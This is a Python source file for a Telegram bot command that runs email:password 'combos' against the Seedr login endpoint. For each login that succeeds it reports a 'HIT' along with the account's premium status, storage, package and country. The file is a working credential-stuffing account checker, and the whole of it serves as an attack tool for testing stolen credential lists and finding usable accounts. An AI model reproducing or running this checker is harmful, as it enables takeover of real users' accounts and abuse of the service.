import requests
import time

def process_seedr_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ SEEDR ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_seedr_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /seedr email:password")

def check_seedr_account(account):
    email, password = account.split(':')
    login_url = "https://www.seedr.cc/auth/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    data = {
        "username": email,
        "password": password,
        "g-recaptcha-response": "",
        "h-captcha-response": "",
        "rememberme": "off"
    }

    response = requests.post(login_url, headers=headers, json=data)
    response_data = response.json()

    if response_data.get("error"):
        return f"Incorrect Email OR Password❌"
    else:
        email = response_data.get("email", "Unknown")
        is_premium = response_data.get("is_premium", False)
        rss_session = response_data["cookies"]["RSESS_session"]
        rss_remember = response_data["cookies"]["RSESS_remember"]

        # Perform the second HTTP request to get account settings
        settings_url = "https://www.seedr.cc/account/settings"
        settings_headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': f'RSESS_session={rss_session}; RSESS_remember={rss_remember}',
            'priority': 'u=1, i',
            'referer': 'https://www.seedr.cc/files',
            'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
        }

        settings_response = requests.get(settings_url, headers=settings_headers)
        settings_data = settings_response.json()

        # Extract necessary information from the response
        account = settings_data.get("account", {})
        storage_max = account.get("space_max", 0)
        package_name = account.get("package_name", "NON-PREMIUM")
        country = settings_data.get("country", "N/A")

        # Convert storage from bytes to GB
        storage_gb = convert_bytes_to_gb(storage_max)

        return (f"HIT SUCCESSFULLY\n"
                f"Premium: {is_premium}\n"
                f"Storage: {storage_gb} GB\n"
                f"Package: {package_name}\n"
                f"Country: {country}")

def convert_bytes_to_gb(bytes):
    gb = bytes / (1024 * 1024 * 1024)
    return round(gb, 2)

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
